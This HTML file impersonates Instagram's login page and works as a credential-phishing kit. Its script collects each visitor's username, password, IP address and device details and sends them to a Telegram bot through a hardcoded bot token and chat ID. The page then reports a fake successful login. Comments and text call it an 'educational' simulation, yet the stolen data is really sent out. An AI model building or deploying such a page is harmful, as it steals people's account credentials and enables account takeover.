<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 60px;
        }
        
        .phone-image {
            flex: 1;
            display: flex;
            justify-content: flex-end;
        }
        
        .phone-image img {
            height: 600px;
        }
        
        .login-box {
            flex: 1;
            max-width: 350px;
        }
        
        .login-form {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo {
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 175px;
        }
        
        .input-group {
            margin-bottom: 6px;
        }
        
        input {
            width: 100%;
            padding: 9px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }
        
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 14px;
            cursor: pointer;
        }
        
        .login-btn:hover {
            background-color: #007acc;
        }
        
        .or-divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .or-divider::before,
        .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .or-divider span {
            padding: 0 18px;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }
        
        .fb-login i {
            margin-right: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 25px;
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .get-app {
            text-align: center;
            font-size: 14px;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        
        .app-stores img {
            height: 40px;
        }
        
        .footer {
            text-align: center;
            margin-top: 50px;
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 5px;
        }
        
        @media (max-width: 875px) {
            .phone-image {
                display: none;
            }
        }
        
        #message {
            margin-top: 15px;
            font-size: 13px;
            min-height: 20px;
        }
        
        .success {
            color: green;
        }
        
        .error {
            color: red;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="phone-image">
            <img src="https://i.imgur.com/1GjB5cN.png" alt="Instagram Preview">
        </div>
        
        <div class="login-box">
            <div class="login-form">
                <div class="logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
                </div>
                
                <form id="instagramLoginForm">
                    <div class="input-group">
                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">Log in</button>
                    
                    <div id="message"></div>
                    
                    <div class="or-divider">
                        <span>OR</span>
                    </div>
                    
                    <a href="#" class="fb-login">
                        <i class="fab fa-facebook-square"></i> Log in with Facebook
                    </a>
                    
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-stores">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_hindi-en.png/4b70f6fae447.png" alt="App Store">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_hindi-en.png/f06b908907d5.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div style="margin-top: 15px;">
            <select style="border: none; background: transparent; color: #8e8e8e; font-size: 12px;">
                <option>English</option>
                <option>‡§π‡§ø‡§®‡•ç‡§¶‡•Ä</option>
            </select>
            <span>¬© 2024 Instagram from Meta</span>
        </div>
    </div>

    <script>
        document.getElementById('instagramLoginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.innerHTML = '<span class="error">Please fill in all fields</span>';
                return;
            }
            
            messageDiv.innerHTML = '<span>Logging in...</span>';
            
            try {
                // Get IP address
                let ipAddress = 'Unable to fetch';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch (ipError) {
                    console.log('Could not fetch IP:', ipError);
                }
                
                // Get additional info
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                const language = navigator.language;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const currentTime = new Date().toLocaleString();
                
                // Prepare message for Telegram
                const telegramMessage = `
üîê Instagram Login Attempt

üë§ Username/Email: ${username}
üîë Password: ${password}

üìç IP Address: ${ipAddress}
üïí Time: ${currentTime}
üåê Timezone: ${timezone}

üñ•Ô∏è Device Info:
‚Ä¢ Browser: ${userAgent}
‚Ä¢ Platform: ${platform}
‚Ä¢ Screen: ${screenSize}
‚Ä¢ Language: ${language}

‚ö†Ô∏è This is a simulated login page for educational purposes only.
                `;
                
                // Send to Telegram bot
                const botToken = '8274526293:AAGVIRjkblQjmZGHy3Xozyp5U-eKZTuhanQ';
                const chatId = '6063973511';
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramMessage,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    messageDiv.innerHTML = '<span class="success">Login successful! Redirecting...</span>';
                    
                    // Simulate redirect
                    setTimeout(() => {
                        // In a real phishing scenario, this would redirect to real Instagram
                        // But for ethical reasons, we'll just show an alert
                        alert('Educational Demo Only:\nUsername: ' + username + '\nPassword: ' + password + '\n\nThis is a simulation. No data was sent to Instagram.');
                        
                        // Reset form
                        document.getElementById('instagramLoginForm').reset();
                        messageDiv.innerHTML = '';
                    }, 1500);
                    
                } else {
                    messageDiv.innerHTML = '<span class="error">Login failed. Please try again.</span>';
                }
                
            } catch (error) {
                console.error('Error:', error);
                messageDiv.innerHTML = '<span class="error">An error occurred. Please try again.</span>';
            }
        });
        
        // Add some Instagram-like interactions
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#a8a8a8';
            });
            
            input.addEventListener('blur', function() {
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
</body>
</html>
